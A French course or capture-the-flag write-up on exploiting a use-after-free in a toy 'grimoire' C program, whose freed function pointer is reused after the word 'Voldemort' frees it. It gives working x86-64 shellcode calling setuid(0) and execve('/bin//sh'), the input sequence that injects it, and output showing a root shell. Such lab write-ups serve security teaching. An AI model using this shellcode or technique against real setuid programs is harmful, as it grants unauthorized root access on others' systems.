# **Rapport GRIMOIRE**

## **Identification de la vulnérabilité**

C'est une vulnérabilté mémoire de type _HEAP-BASED_/_Use-After-Free_. On la retrouve dans la fonction **main** à la ligne **71** avec le **free(active_spell)** puis elle s'exécute ligne 57 **((void (*)(void))active_spell)();**.

## **Analyse**

La faille se trouve au niveau du **free(active_spell)** ligne 71 et n'est pas remis à NULL.
En indiqunt le mot "Voldemort", cela provoque la déstruction.
La taille du **chunk mémoire** est de **128**.
Elle s'exécute à la ligne 57 **((void (*)(void))active_spell)();**.

## **Stratégie d'exploitation**

Le point de rupture est identifié dans le code avec **#define CHUNK_SIZE 128**. Les malloc allouent donc **128**. Ensuite, lorsqu'on lance le programme après avoir appris un sort, écrit "Voldemort" et lancé le sort, on a remarque que le pointeur n'est pas **NULL** même après avoir brulé le sort (free()).

Après identification, on s'attaque à la stratégie d'exploitation.

On commence par créer un **payload.bin** qui va contenir les runes majeures soit, les **instructions Assembleur**.
Les instructions qui nous intèresse sont les suivantes:

| Instruction ASM | Opcode (Hex) | Signification                                      |
| :-------------- | :----------- | :------------------------------------------------- |
| `xor rdi, rdi`  | `48 31 ff`   | Met le registre RDI à 0 (Argument : UID 0 = Root). |
| `push 0x69`     | `6a 69`      | Pousse 105 sur la pile.                            |
| `pop rax`       | `58`         | Met 105 dans RAX (Numéro du syscall `setuid`).     |
| `syscall`       | `0f 05`      | Appelle le noyau Linux pour exécuter l'ordre.      |

Une fois devenu Root, vous devez invoquer le terminal.

| Instruction ASM | Opcode (Hex)   | Signification                                   |
| :-------------- | :------------- | :---------------------------------------------- |
| `xor rsi, rsi`  | **`48 31 f6`** | Nettoie RSI (pas d'arguments).                  |
| `push rsi`      | **`56`**       | Fin de chaîne (NULL byte).                      |
| `mov rdi, ...`  | **`48 bf`**    | Place "/bin//sh" dans RDI.                      |
| `push 0x3b`     | `6a 3b`        | Place 59 dans RAX (Numéro du syscall `execve`). |
| `syscall`       | `0f 05`        | Exécute `/bin/sh`.                              |

Certaines parties étaient manquantes, donc on fait de l'assemblage pour compléter le tableau.

Par exemple:

```
linux@linux-VirtualBox:~/MCS26-3_Cours_C_DO_Quoc_Tan/grimoire$ echo "xor rsi, rsi;" > shell.asm

linux@linux-VirtualBox:~/MCS26-3_Cours_C_DO_Quoc_Tan/grimoire$ nasm -f elf64 shell.asm -o shell.o

linux@linux-VirtualBox:~/MCS26-3_Cours_C_DO_Quoc_Tan/grimoire$ objdump -d shell.o



shell.o:     format de fichier elf64-x86-64





Déassemblage de la section .text :



0000000000000000 <.text>:

   0:	48 31 f6             	xor    %rsi,%rsi

```

on a donc cette commande pour la création du **payload.bin**:
**echo -ne "\x48\x31\xff\x6a\x69\x58\x0f\x05\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x0f\x05" > payload.bin**

Ensuite, lancer le programme avec ceci:
**(echo "1"; echo "3"; echo "Voldemort"; echo "3"; cat payload.bin; echo ""; echo "2"; cat) | ./grimoire**

## **Résultats**

```
linux@linux-VirtualBox:~/MCS26-3_Cours_C_DO_Quoc_Tan/grimoire$ (echo "1"; echo "3"; echo "Voldemort"; echo "3"; cat payload.bin; echo ""; echo "2"; cat) | ./grimoire


=== THE FORBIDDEN GRIMOIRE (FIXED) ===

1. Learn a Spell

2. Cast Spell

3. Write in Diary

4. Exit

> [+] Spell learned at 0x11122a0.


=== THE FORBIDDEN GRIMOIRE (FIXED) ===

1. Learn a Spell

2. Cast Spell

3. Write in Diary

4. Exit

> Write (128 chars max): [!] CURSED WORD! BURNING PAGES!


=== THE FORBIDDEN GRIMOIRE (FIXED) ===

1. Learn a Spell

2. Cast Spell

3. Write in Diary

4. Exit

> Write (128 chars max): [+] Entry saved.


=== THE FORBIDDEN GRIMOIRE (FIXED) ===

1. Learn a Spell

2. Cast Spell

3. Write in Diary

4. Exit

> [*] Casting spell at 0x11122a0...

id

uid=0(root) gid=1000(linux) groups=1000(linux),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),134(lxd),135(sambashare)
```



